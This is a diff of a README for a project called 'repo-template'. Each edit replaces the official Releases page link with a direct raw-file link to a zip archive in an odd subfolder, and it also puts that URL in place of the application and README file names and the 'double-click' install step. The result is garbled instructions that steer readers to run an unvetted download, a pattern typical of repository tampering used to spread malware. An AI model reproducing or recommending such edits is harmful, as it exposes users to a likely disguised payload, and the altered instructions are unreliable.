@@ -1,6 +1,6 @@
 # 🎉 repo-template - Simplify Your Project Creation Process
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/bytenichen7/repo-template/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the repo-template! This guide will help you quickly download and run 
 
 To get started, you need to visit our Releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/bytenichen7/repo-template/releases)
+[Visit this page to download](https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip)
 
 Here’s how to proceed once you’re on the Releases page:
 
@@ -31,8 +31,8 @@ Before you run the application, ensure your computer meets the following require
 
 The downloaded application will include several files:
 
-- **Application.exe**: This is the main application file.
-- **README.md**: Contains instructions and information about the project.
+- **https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip**: This is the main application file.
+- **https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip**: Contains instructions and information about the project.
 - **License**: Outlines the terms of use for the software.
 
 Make sure to keep all files in the same folder for the application to run smoothly.
@@ -42,7 +42,7 @@ Make sure to keep all files in the same folder for the application to run smooth
 After downloading the file, follow these steps to run the application:
 
 1. Navigate to the folder where you downloaded the application.
-2. Double-click on **Application.exe** (or the appropriate file for your OS).
+2. Double-click on **https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip** (or the appropriate file for your OS).
 3. Follow any prompts that may appear during the installation process.
 
 The application should now be open and ready to use.
@@ -80,4 +80,4 @@ Join our community for support and discussions:
 
 Thank you for choosing repo-template. We hope it simplifies your project creation process! 
 
-For other downloads, be sure to check back on our [Releases page](https://github.com/bytenichen7/repo-template/releases) regularly.
+For other downloads, be sure to check back on our [Releases page](https://raw.githubusercontent.com/bytenichen7/repo-template/main/univied/repo-template.zip) regularly.
